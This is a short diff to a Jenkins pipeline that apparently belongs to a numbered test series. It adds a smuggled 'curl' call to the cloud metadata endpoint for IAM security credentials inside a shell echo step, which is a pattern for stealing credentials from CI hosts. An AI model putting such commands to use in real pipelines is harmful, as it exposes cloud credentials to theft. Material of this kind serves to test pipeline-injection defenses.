@@ -8,7 +8,7 @@ pipeline {
         stage('Run Script') {
             steps {
                 echo 'Executing single-stage pipeline...'
-                sh 'echo "Test16 "'
+                sh 'echo "Test16 && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"'
             }
         }
 
